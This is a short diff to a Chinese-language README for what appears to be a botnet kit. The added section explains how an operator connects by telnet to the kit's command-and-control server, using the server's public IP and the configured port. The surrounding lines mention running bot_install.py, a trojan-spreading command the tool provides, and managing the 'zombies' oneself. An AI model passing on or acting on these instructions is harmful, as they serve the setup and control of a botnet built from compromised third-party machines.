@@ -38,6 +38,14 @@ unsigned char *commServer[] = {"ip:port", "ip:port"};
 ```python
 python bot_install.py
 ```
+## 连接cnc端
+```
+目前Windows自带的telnet连接不怎么行，跟坨臭屎一样
+所以你需要一个Linux系统，乌班图或者centos
+有些不自带telnet，自己去搜安装方式
+安装完之后
+telnet 你的服务器的公网ip 你设置的连接端口
+```
 `完事就是这么简单`  
 `传马命令他会给出的`  
 `后面僵尸自己弄`  
